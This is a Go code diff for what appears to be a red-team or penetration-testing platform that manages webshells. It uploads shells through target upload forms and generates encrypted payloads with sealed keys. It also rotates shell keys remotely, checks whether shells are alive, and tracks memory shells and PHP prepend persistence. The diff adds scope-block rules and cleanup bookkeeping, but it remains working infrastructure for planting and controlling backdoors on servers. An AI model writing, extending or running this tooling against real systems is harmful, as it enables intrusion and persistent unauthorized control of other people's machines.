@@ -1161,14 +1161,39 @@ func (r *deepRun) runWebshellInject(summary map[string]any) (string, string, str
 		return "failed", "failed", "缺少上传地址", summary
 	}
 	shellType := stringParam(r.task.Params, "shell_type")
-	password := stringParam(r.task.Params, "password")
 	fieldName := stringParam(r.task.Params, "field_name")
 	fileName := stringParam(r.task.Params, "file_name")
 	landURL := stringParam(r.task.Params, "land_url")
 	extra := mapParam(r.task.Params, "extra")
 	headers := mapParam(r.task.Params, "headers")
+	protocol := strings.ToLower(stringParam(r.task.Params, "protocol"))
+	if protocol != scanner.ShellProtocolLegacy {
+		protocol = scanner.ShellProtocolV2
+	}
 
-	payload := scanner.BuildShellPayload(shellType, password)
+	var payload scanner.ShellPayload
+	var sealedSecret string
+	if protocol == scanner.ShellProtocolV2 {
+		var err error
+		payload, sealedSecret, err = r.s.newV2ShellMaterial(shellType, 1)
+		if err != nil {
+			return "failed", "failed", "生成加密 webshell 载荷失败: " + err.Error(), summary
+		}
+	} else {
+		password := stringParam(r.task.Params, "password")
+		if password == "" {
+			generated, gerr := scanner.GenerateShellPassword()
+			if gerr != nil {
+				return "failed", "failed", "生成 webshell 口令失败: " + gerr.Error(), summary
+			}
+			password = generated
+		}
+		var err error
+		payload, err = scanner.BuildShellPayload(shellType, password)
+		if err != nil {
+			return "failed", "failed", err.Error(), summary
+		}
+	}
 	if fileName == "" && landURL != "" {
 		if u, err := url.Parse(landURL); err == nil {
 			if base := path.Base(u.Path); base != "." && base != "/" && base != "" {
@@ -1182,9 +1207,11 @@ func (r *deepRun) runWebshellInject(summary map[string]any) (string, string, str
 	summary["upload_url"] = uploadURL
 	summary["land_url"] = landURL
 	summary["file_name"] = payload.Filename
+	summary["protocol"] = payload.Protocol
+	summary["payload_sha256"] = payload.SHA256
 	client := r.newDeepClient(20 * time.Second)
 	fieldName, extra = r.probeUploadFormFields(client, uploadURL, fieldName, extra, headers, summary)
-	r.logf("inject", "上传 webshell 到 %s（类型 %s，文件 %s，字段 %q）", uploadURL, payload.Type, payload.Filename, displayOr(fieldName, "raw"))
+	r.logf("inject", "上传 webshell 到 %s（协议 %s，类型 %s，文件 %s，字段 %q）", uploadURL, payload.Protocol, payload.Type, payload.Filename, displayOr(fieldName, "raw"))
 	res := scanner.UploadWebshell(r.ctx, client, uploadURL, fieldName, payload.Filename, []byte(payload.Content), extra, headers)
 	summary["upload_status"] = res.StatusCode
 	summary["upload_success"] = res.Success
@@ -1215,16 +1242,40 @@ func (r *deepRun) runWebshellInject(summary map[string]any) (string, string, str
 		r.logf("inject", "落地验证 %s: %s", landURL, note)
 	}
 	name := displayOr(stringParam(r.task.Params, "name"), payload.Filename)
-	ws, err := r.pg.CreateWebshell(db.WebshellInput{
-		Name:      name,
-		URL:       landURL,
-		ShellType: payload.Type,
-		Password:  payload.Password,
-		Target:    displayOr(r.task.Target, uploadURL),
-		Source:    "inject",
-		TaskID:    &r.task.ID,
-		Note:      truncateText(res.Response, 2000),
-	})
+	in := db.WebshellInput{
+		Name:          name,
+		URL:           landURL,
+		ShellType:     payload.Type,
+		Protocol:      payload.Protocol,
+		Password:      payload.Password,
+		Secret:        sealedSecret,
+		Carrier:       payload.Carrier,
+		PayloadSHA256: payload.SHA256,
+		KeyVersion:    payload.KeyVersion,
+		Target:        displayOr(r.task.Target, uploadURL),
+		Source:        "inject",
+		TaskID:        &r.task.ID,
+		Note:          truncateText(res.Response, 2000),
+	}
+	// The upload already replaced whatever sat at landURL, so a record for that
+	// address is now describing a payload that is gone. Inserting a second row
+	// would strand it: bound sessions keep the dead key, and evacuation deletes
+	// the wrong file. Re-point the existing row instead and say so in the report.
+	existing := findRegisteredWebshell(r.pg, landURL)
+	var ws *db.Webshell
+	var err error
+	if existing != nil {
+		ws, err = r.s.reclaimRegisteredWebshell(r.pg, existing, in, uploadURL)
+		summary["superseded_webshell_id"] = existing.ID
+		summary["superseded_payload_sha256"] = existing.PayloadSHA256
+		if existing.TaskID != nil && *existing.TaskID != r.task.ID {
+			summary["superseded_task_id"] = *existing.TaskID
+		}
+		r.logf("inject", "落地地址 %s 上原有壳 #%d，本次上传覆盖了该文件：记录改为描述新载荷，旧壳的受管资源台账按覆盖释放",
+			landURL, existing.ID)
+	} else {
+		ws, err = r.s.storeManagedWebshell(r.pg, in, uploadURL, landURL)
+	}
 	if err != nil {
 		return "failed", "failed", "写入 webshell 记录失败: " + err.Error(), summary
 	}
@@ -1235,9 +1286,12 @@ func (r *deepRun) runWebshellInject(summary map[string]any) (string, string, str
 	if err := r.pg.UpdateWebshellState(ws.ID, status, "", res.Note); err != nil {
 		r.logf("inject", "更新 webshell 状态失败: %v", err)
 	}
-	r.s.registerWebshellResource(ws, uploadURL, landURL)
 	summary["webshell_id"] = ws.ID
 	summary["alive"] = alive
+	if existing != nil {
+		note = fmt.Sprintf("原壳 #%d 的落地文件被本次上传覆盖，记录已改为描述新载荷（旧载荷 sha256=%s）；绑在壳 #%d 上的会话会改用新密钥。%s",
+			existing.ID, displayOr(existing.PayloadSHA256, "未记录"), existing.ID, note)
+	}
 	summary["note"] = note
 	r.setProgress("inject", map[string]any{"webshell_id": ws.ID, "alive": alive})
 	return "done", "done", "", summary
@@ -1472,6 +1526,138 @@ func (s *Server) listWebshells(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, 200, map[string]any{"webshells": shells, "total": total})
 }
 
+// buildWebshellMaterial fills the protocol-specific columns of a webshell input
+// and returns the payload the platform will speak to that shell with. badRequest
+// tells the HTTP layer the caller's input was wrong (400) rather than the store
+// failing (500).
+func (s *Server) buildWebshellMaterial(in *db.WebshellInput) (payload scanner.ShellPayload, badRequest bool, err error) {
+	protocol := strings.ToLower(strings.TrimSpace(in.Protocol))
+	if protocol == "" {
+		if strings.TrimSpace(in.Password) != "" {
+			protocol = scanner.ShellProtocolLegacy
+		} else {
+			protocol = scanner.ShellProtocolV2
+		}
+	}
+	switch protocol {
+	case scanner.ShellProtocolV2:
+		payload, sealed, merr := s.newV2ShellMaterial(in.ShellType, 1)
+		if merr != nil {
+			return scanner.ShellPayload{}, true, merr
+		}
+		in.Protocol = scanner.ShellProtocolV2
+		in.Password = ""
+		in.Secret = sealed
+		in.Carrier = payload.Carrier
+		in.PayloadSHA256 = payload.SHA256
+		in.KeyVersion = 1
+		return payload, false, nil
+	case scanner.ShellProtocolLegacy:
+		if strings.TrimSpace(in.Password) == "" {
+			return scanner.ShellPayload{}, true,
+				errors.New("旧版 webshell 必须设置口令；推荐使用加密 v2（自动生成密钥，无需口令）")
+		}
+		payload, merr := scanner.BuildShellPayload(in.ShellType, in.Password)
+		if merr != nil {
+			return scanner.ShellPayload{}, true, merr
+		}
+		in.Protocol = scanner.ShellProtocolLegacy
+		in.Password = payload.Password
+		in.Secret = ""
+		in.Carrier = ""
+		in.PayloadSHA256 = payload.SHA256
+		in.KeyVersion = 1
+		return payload, false, nil
+	default:
+		return scanner.ShellPayload{}, true, errors.New("protocol 必须是 v2 或 legacy")
+	}
+}
+
+// webshellURLTaken says a registration would create a second record for a URL
+// that already carries one. It is returned instead of inserting so every caller
+// has to state what it wants: a manual registration has nothing to add, while a
+// re-injection genuinely replaced the file on the target and must re-point the
+// existing row rather than strand it.
+type webshellURLTaken struct{ Existing *db.Webshell }
+
+func (e *webshellURLTaken) Error() string {
+	if e.Existing == nil {
+		return "该 webshell 地址已登记"
+	}
+	return fmt.Sprintf("该 webshell 地址已登记为壳 #%d（协议 %s，旧载荷 sha256=%s）",
+		e.Existing.ID, displayOr(e.Existing.Protocol, "legacy"),
+		displayOr(e.Existing.PayloadSHA256, "未记录"))
+}
+
+// findRegisteredWebshell returns the record that already owns rawURL, or nil.
+func findRegisteredWebshell(pg *db.DB, rawURL string) *db.Webshell {
+	if pg == nil {
+		return nil
+	}
+	existing, err := pg.FindWebshellByURL(rawURL)
+	if err != nil || existing == nil {
+		return nil
+	}
+	return existing
+}
+
+// storeManagedWebshell inserts the row and puts it into the resource ledger in
+// one step. Every path that produces a webshell goes through here: the ledger
+// row and the task binding are what evacuation walks, so a shell stored without
+// them would leave a live file on the target invisible to cleanup.
+func (s *Server) storeManagedWebshell(pg *db.DB, in db.WebshellInput, uploadURL, landURL string) (*db.Webshell, error) {
+	if existing := findRegisteredWebshell(pg, displayOr(in.URL, landURL)); existing != nil {
+		return existing, &webshellURLTaken{Existing: existing}
+	}
+	shell, err := pg.CreateWebshell(in)
+	if err != nil {
+		return nil, err
+	}
+	s.registerWebshellResource(shell, uploadURL, landURL)
+	return shell, nil
+}
+
+// reclaimRegisteredWebshell points the record that owns in.URL at the payload now
+// sitting at that path. The id is kept on purpose: intranet sessions bind to it,
+// and two ledger rows for one file would send evacuation to self-delete whichever
+// payload it reaches first while the real one stays on the target — and every
+// command through a session bound to the dead row would fail the MAC check.
+func (s *Server) reclaimRegisteredWebshell(pg *db.DB, existing *db.Webshell, in db.WebshellInput, uploadURL string) (*db.Webshell, error) {
+	if existing == nil {
+		return s.storeManagedWebshell(pg, in, uploadURL, in.URL)
+	}
+	reason := fmt.Sprintf("壳 #%d 的落地地址被重新投放覆盖：载荷换为 sha256=%s（原 %s），密钥与指纹随新载荷更新",
+		existing.ID, displayOr(in.PayloadSHA256, "未记录"), displayOr(existing.PayloadSHA256, "原载荷未记录"))
+	if note := strings.TrimSpace(in.Note); note != "" {
+		in.Note = reason + "；" + note
+	} else {
+		in.Note = reason
+	}
+	if err := pg.ReleaseManagedResourceByWebshell(existing.ID, reason+"；台账改由新投放接管"); err != nil {
+		log.Printf("[webshell] 释放被覆盖的壳 #%d 台账: %v", existing.ID, err)
+	}
+	shell, err := pg.ReclaimWebshellForReinject(existing.ID, in)
+	if err != nil {
+		return nil, err
+	}
+	s.registerWebshellResource(shell, uploadURL, shell.URL)
+	return shell, nil
+}
+
+// registerManagedWebshell builds the protocol material and stores the shell.
+// badRequest mirrors buildWebshellMaterial so the HTTP layer can answer 400.
+func (s *Server) registerManagedWebshell(pg *db.DB, in db.WebshellInput, uploadURL, landURL string) (*db.Webshell, scanner.ShellPayload, bool, error) {
+	payload, badRequest, err := s.buildWebshellMaterial(&in)
+	if err != nil {
+		return nil, scanner.ShellPayload{}, badRequest, err
+	}
+	shell, err := s.storeManagedWebshell(pg, in, uploadURL, landURL)
+	if err != nil {
+		return nil, payload, false, err
+	}
+	return shell, payload, false, nil
+}
+
 // createWebshell registers a webshell by hand.
 func (s *Server) createWebshell(w http.ResponseWriter, r *http.Request) {
 	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
@@ -1493,12 +1679,22 @@ func (s *Server) createWebshell(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
 		return
 	}
-	shell, err := pg.CreateWebshell(req)
+	shell, _, badRequest, err := s.registerManagedWebshell(pg, req, req.URL, "")
 	if err != nil {
-		writeErr(w, 500, err.Error())
+		var taken *webshellURLTaken
+		if errors.As(err, &taken) {
+			// A hand-written entry that repeats a URL the platform already manages
+			// would put a key on that path which the file there does not answer to.
+			writeErr(w, 400, err.Error()+"；同一地址只应保留一条记录，请编辑壳 #"+strconv.FormatInt(taken.Existing.ID, 10)+" 或换一个落地路径")
+			return
+		}
+		code := 500
+		if badRequest {
+			code = 400
+		}
+		writeErr(w, code, err.Error())
 		return
 	}
-	s.registerWebshellResource(shell, req.URL, "")
 	writeJSON(w, 201, shell)
 }
 
@@ -1519,9 +1715,24 @@ func (s *Server) updateWebshell(w http.ResponseWriter, r *http.Request) {
 	if pg == nil {
 		return
 	}
+	existing, err := pg.GetWebshell(id)
+	if err != nil {
+		writeErr(w, 404, "webshell 不存在")
+		return
+	}
 	if reason, allowed := shellAllowed(pg, req.URL); !allowed {
 		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
 		return
+	}
+	if strings.EqualFold(existing.Source, "php_prepend") &&
+		strings.TrimSpace(req.URL) != strings.TrimSpace(existing.URL) {
+		writeErr(w, 400, "半持久化 webshell 的地址由部署时的 prepend 配置决定，不能直接修改；请撤销落地物后重新部署")
+		return
+	}
+	// v2 shells carry their key inside the payload; a request password would
+	// only add a meaningless plaintext credential to the record.
+	if existing.Protocol == scanner.ShellProtocolV2 {
+		req.Password = ""
 	}
 	if err := pg.UpdateWebshell(id, req); err != nil {
 		writeErr(w, 500, err.Error())
@@ -1541,7 +1752,108 @@ func (s *Server) updateWebshell(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, 200, shell)
 }
 
-// deleteWebshell removes a webshell record.
+// webshellPayload returns the deployable encrypted source for a v2 shell so an
+// operator can re-plant or verify it. Legacy shells have no generated source
+// beyond a trivial eval stub and are rejected.
+func (s *Server) webshellPayload(w http.ResponseWriter, r *http.Request) {
+	id, ok := pathInt(r, "id")
+	if !ok {
+		writeErr(w, 400, "无效的 webshell ID")
+		return
+	}
+	pg := s.pg(w)
+	if pg == nil {
+		return
+	}
+	shell, err := pg.GetWebshell(id)
+	if err != nil {
+		writeErr(w, 404, "webshell 不存在")
+		return
+	}
+	payload, err := s.renderShellPayloadFor(shell)
+	if err != nil {
+		writeErr(w, 400, err.Error())
+		return
+	}
+	w.Header().Set("Cache-Control", "no-store")
+	writeJSON(w, 200, map[string]any{
+		"filename": payload.Filename,
+		"content":  payload.Content,
+		"sha256":   payload.SHA256,
+		"carrier":  payload.Carrier,
+		"protocol": payload.Protocol,
+	})
+}
+
+// rotateWebshellKey sends an authenticated rotation command with the old key,
+// verifies the new-key ack, then stores the new secret. The response includes a
+// freshly rendered payload with the same carrier in case the operator needs to
+// re-upload the file too (PHP also rewrites itself in place).
+func (s *Server) rotateWebshellKey(w http.ResponseWriter, r *http.Request) {
+	id, ok := pathInt(r, "id")
+	if !ok {
+		writeErr(w, 400, "无效的 webshell ID")
+		return
+	}
+	pg := s.pg(w)
+	if pg == nil {
+		return
+	}
+	shell, err := pg.GetWebshell(id)
+	if err != nil {
+		writeErr(w, 404, "webshell 不存在")
+		return
+	}
+	if !strings.EqualFold(shell.Protocol, scanner.ShellProtocolV2) {
+		writeErr(w, 400, "只有加密 v2 webshell 支持密钥轮换")
+		return
+	}
+	if strings.TrimSpace(shell.URL) == "" {
+		writeErr(w, 400, "该 webshell 没有可用地址")
+		return
+	}
+	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
+		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
+		return
+	}
+	payload, err := s.shellPayloadFor(shell)
+	if err != nil {
+		writeErr(w, 400, err.Error())
+		return
+	}
+	newKey, err := scanner.GenerateShellKey()
+	if err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	}
+	client := scanner.NewDeepClient(20 * time.Second)
+	if err := scanner.RotateShellKey(s.ctx, client, shell.URL, payload, newKey); err != nil {
+		_ = pg.UpdateWebshellState(shell.ID, "dead", "", "密钥轮换失败: "+err.Error())
+		writeErr(w, 502, "密钥轮换失败: "+err.Error())
+		return
+	}
+	sealed, err := sealShellSecret(s.jwtKey, scanner.EncodeShellKey(newKey))
+	if err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	}
+	keyVersion := shell.KeyVersion + 1
+	if err := pg.UpdateWebshellSecret(shell.ID, sealed, shell.Carrier, shell.PayloadSHA256, keyVersion); err != nil {
+		writeErr(w, 500, "新密钥已生效但写入数据库失败: "+err.Error())
+		return
+	}
+	_ = pg.UpdateWebshellState(shell.ID, "alive", "", "密钥已轮换到 v"+strconv.Itoa(keyVersion))
+	resp := map[string]any{"ok": true, "key_version": keyVersion}
+	if updated, gerr := pg.GetWebshell(shell.ID); gerr == nil {
+		if rendered, rerr := s.renderShellPayloadFor(updated); rerr == nil {
+			resp["payload"] = rendered.Content
+			resp["filename"] = rendered.Filename
+			resp["sha256"] = rendered.SHA256
+		}
+	}
+	w.Header().Set("Cache-Control", "no-store")
+	writeJSON(w, 200, resp)
+}
 func (s *Server) deleteWebshell(w http.ResponseWriter, r *http.Request) {
 	id, ok := pathInt(r, "id")
 	if !ok {
@@ -1550,6 +1862,20 @@ func (s *Server) deleteWebshell(w http.ResponseWriter, r *http.Request) {
 	}
 	pg := s.pg(w)
 	if pg == nil {
+		return
+	}
+	if n, err := pg.CountJavaMemshellsByWebshell(id); err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	} else if n > 0 {
+		writeErr(w, 409, fmt.Sprintf("该 webshell 还有 %d 个内存马记录，请先在内存马列表移除（或强制清理记录）后再删除", n))
+		return
+	}
+	if arts, err := pg.ListActivePHPPersistArtifactsByWebshell(id); err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	} else if len(arts) > 0 {
+		writeErr(w, 409, fmt.Sprintf("该 webshell 仍被 %d 个 PHP 半持久化落地物引用，请先在落地物台账撤销后再删除", len(arts)))
 		return
 	}
 	ok2, err := pg.DeleteWebshell(id)
@@ -1589,7 +1915,11 @@ func (s *Server) checkWebshell(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
 		return
 	}
-	payload := scanner.BuildShellPayload(shell.ShellType, shell.Password)
+	payload, err := s.shellPayloadFor(shell)
+	if err != nil {
+		writeErr(w, 400, err.Error())
+		return
+	}
 	client := scanner.NewDeepClient(15 * time.Second)
 	alive, note := scanner.CheckShellAlive(s.ctx, client, shell.URL, payload)
 	status := "dead"
@@ -1603,49 +1933,5 @@ func (s *Server) checkWebshell(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, 200, map[string]any{"alive": alive, "status": status, "note": note})
 }
 
-// execWebshellCommand runs one command through a webshell.
-func (s *Server) execWebshellCommand(w http.ResponseWriter, r *http.Request) {
-	id, ok := pathInt(r, "id")
-	if !ok {
-		writeErr(w, 400, "无效的 webshell ID")
-		return
-	}
-	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
-	var req struct {
-		Command string `json:"command"`
-	}
-	if err := decode(r, &req); err != nil {
-		writeErr(w, 400, "请求格式错误")
-		return
-	}
-	if strings.TrimSpace(req.Command) == "" {
-		writeErr(w, 400, "命令不能为空")
-		return
-	}
-	pg := s.pg(w)
-	if pg == nil {
-		return
-	}
-	shell, err := pg.GetWebshell(id)
-	if err != nil {
-		writeErr(w, 404, "webshell 不存在")
-		return
-	}
-	if strings.TrimSpace(shell.URL) == "" {
-		writeErr(w, 400, "该 webshell 没有可用地址")
-		return
-	}
-	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
-		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
-		return
-	}
-	payload := scanner.BuildShellPayload(shell.ShellType, shell.Password)
-	client := scanner.NewDeepClient(20 * time.Second)
-	out, err := scanner.RunShellCommand(s.ctx, client, shell.URL, payload, req.Command)
-	if err != nil {
-		writeErr(w, 500, "命令执行失败: "+err.Error())
-		return
-	}
-	_ = pg.UpdateWebshellState(shell.ID, "alive", truncateText(out, 8000), "")
-	writeJSON(w, 200, map[string]any{"output": out})
-}
+// execWebshellCommand lives in shell_terminal.go: it shares the virtual
+// terminal semantics (cwd / exit code / bounded wait) with memory-horse exec.
